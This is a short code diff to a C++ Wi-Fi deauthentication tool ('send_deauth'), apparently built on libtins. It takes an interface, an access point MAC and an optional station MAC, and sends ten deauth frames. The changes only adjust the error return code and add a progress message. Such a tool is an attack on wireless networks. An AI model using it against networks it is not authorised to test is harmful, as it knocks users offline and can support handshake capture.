@@ -15,12 +15,13 @@ int main(int argc, char *argv[])
 
     if(argc < 3){
         cout << "send_deauth <interce name> <ap mac> [<station mac>]" << endl;
-        return 0;
+        return 1;
     }else if(argc == 3){
         st_addr = Dot11::BROADCAST;
     }else{
         st_addr = HWAddress<6>(argv[3]);
     }
+
     if_name = argv[1];
     ap_addr = HWAddress<6>(argv[2]);
 
@@ -36,6 +37,7 @@ int main(int argc, char *argv[])
     /* send deauth packet */
     for(int i=0; i<10; i++){
         sender.send(tap, iface);
+        printf("[%d/10] send deauth\n",i+1);
         usleep(100000);
     }
 
